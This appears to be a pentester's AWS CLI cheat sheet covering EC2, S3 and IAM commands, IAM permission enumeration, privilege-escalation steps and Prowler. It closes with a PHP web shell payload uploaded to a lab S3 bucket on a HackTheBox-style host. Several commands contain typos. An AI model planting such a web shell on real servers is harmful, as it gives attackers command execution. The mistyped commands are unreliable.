- [Profile Configuration](#pc)
- [EC2](#ec2)
- [S3](#s3)
- [IAM](#iam)
- [prowler](#p)
- [aws reverse shell](#awsrs)

# Profile configuration <a name="pc"></a>
```bash
aws configure --profile <profile_name>
```
It will be necessary to introduce the **AWS ACCESS KEY ID** and the **AWS SECRET ACCESS KEY** of your account. Also, you need to specify the region name and the output format.

## Actual profile information
```bash
aws sts get-caller-identity --profile <profile_name>
```
# EC2 <a name="ec2"></a>

## Commands
- Create key pair:
```bash
aws ec2 create-key-pair --key-name <key_pair_name> --query 'KeyMaterial' --output text > <key_pair_name>
```
- Create and run instance: 
```bash
aws ec2 run-instances --image-id <image-id> --count 1 --instance-type t2.micro --key-name <key_name>
```
- List created instances:
```bash
aws ec2 describe-instances
```
- Terminate instance:
```bash
aws ec2 terminate-instances --instance-ids <instance_id>
```
- Delete key pair:
```bash
aws ec2 delete-key-pair --key-name <key_pair_name>
```

# S3 <a name="s3"></a>

## Commands
- Create a bucket:
```bash
aws s3 mb s3://<bucket_name>
```
The bucket name needs to be unique.

- List buckets:
```bash
aws s3 ls
```
- List an specific bucket:
```bash
aws s3 ls s3://<bucket_name>
```
- List an specific bucket without session credentials:
```bash
aws s3 ls s3://<bucket_name> --no-sign-request
```
- Copy a local file to the bucket:
```bash
aws s3 cp <file_name> s3://<bucket_name>
```
- Copy a bucket file to the actual localhost directory:

```bash
aws s3 cp  3://<bucket_name>/<file_name> ./
```
- Delete file from a bucket
```bash
aws s3 rm s3://<bucket_name>/<file_name>
```
- Sync bucket data with a local directory:
```bash
aws s3 sync s3://<bucket_name> <local_directory>
```
- Eliminate all the contents of the bucket:
```bash
aws s3 rm s3://<bucket_name> --recursive
```
- Eliminate bucket:
```bash
aws s3 rb s3://<bucket_name> --recursive
```

# IAM <a name="iam"></a>

## Commands
- Create an IAM group:
```bash
aws iam create-group --group-name <group_name>
```
- Create IAM user:
```bash
aws iam create-user --user-name <username>
```
- Add user to a group:
```bash
aws iam add-user-to-group --user-name <username> --group-name <group_name>
```
- List group users:
```bash
aws iam get-group --group-name <group_name>
```
- Assign permissions to a user using policies:
```bash
aws iam attach-user-policy --user-name <username> --policy-arn arn:aws:iam::aws:policy/Amazons3FullAccess
```
- Create access key for a user:
```bash
aws iam create-access-key --user-name <username>
```
- List all users:
```bash
aws iam list-users
```
- List IAM policies for a user:
```bash
aws iam list-user-poluccues --user-name <username>
```
- Get information about a specific policy:
```bash
aws iam get-policy --policy-arn <policy_arn>
```
- Get more information about a specific policy:
	You can see the value tor the `DefaultVeriosnId` field using the previous command
```bash
aws iam get-policy --policy-arn <policy_arn> --version-id <DefaultVeriosnId>
```
- List all IAM roles:
```bash
aws iam list-roles
```
- Get information about a specific role:
```bash
aws iam list-attached-role-policies --role-name <role_name>
```


## Permissions enumeration - enumerate-iam.py
This script will enumerate all the services that can be used for this user. This script can be easily detected as it does a lot of querys in few time.
```bash
python3 enumerate-iam.py --access-key <access_key> --secret-key <secret_key>
```

# Privilege escalation
## Using IAM 
Example: https://github.com/R-kill-9/AWSGoat/blob/master/attack-manuals/module-2/04-IAM%20Privilege%20Escalation.md

A possible privIlege escalation could be done following this steps
- List all users (IAM)
- List IAM policies for a user (IAM)
- Get information about a specific policy (IAM)
- Get more information about a specific policy (IAM)
- List all IAM roles (IAM)
- Get information about a specific role (IAM)

# prowler <a name="p"></a>

**Prowler** is an Open Source security tool to perform AWS, GCP and Azure security best practices assessments, audits, incident response, continuous monitoring, hardening and forensics readiness.

It contains hundreds of controls covering CIS, NIST 800, NIST CSF, CISA, RBI, FedRAMP, PCI-DSS, GDPR, HIPAA, FFIEC, SOC2, GXP, AWS Well-Architected Framework Security Pillar, AWS Foundational Technical Review (FTR), ENS (Spanish National Security Scheme) and your custom security frameworks.

- Use a custom AWS profile with `-p`/`--profile` and/or AWS regions which you want to audit with `-f`/`--filter-region`:

```bash
prowler aws --profile custom-profile -f us-east-1 eu-south-2
```

# aws reverse shell <a name="awsrs"></a>

The `aws reverse shell` command is used to copy files from your local machine to one of the AWS buckets. After copying the file, you can access it and enter commands.

- `endpoint`: URL where S3 is located (replace with `s3` or another subdomain if found).
- `s3`: Interacts with the S3 service (replace with the discovered subdomain from gobuster subdomain search).
- `cp`: Copies the specified file, in this case, `shell.php`, to the bucket.
- `shell.php`: The file to be copied, containing `<?php system($_GET["cmd"]); ?>` code.
- `s3://{bucket name}`: Name of the bucket to interact with.

````bash
aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
````